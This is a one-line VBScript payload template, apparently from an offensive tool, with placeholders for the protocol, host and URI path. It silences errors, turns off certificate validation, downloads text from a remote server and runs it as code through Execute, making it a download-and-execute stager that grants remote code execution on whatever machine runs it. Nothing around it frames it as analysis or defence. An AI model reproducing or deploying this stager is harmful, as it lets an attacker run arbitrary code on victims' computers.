On Error Resume Next:Set X=CreateObject("MSXML2.ServerXMLHTTP.6.0"):X.setOption 2,13056:X.Open"GET","<http_prefix>://<host_and_port><registered_uri_path>",0:X.Send:Execute X.responseText
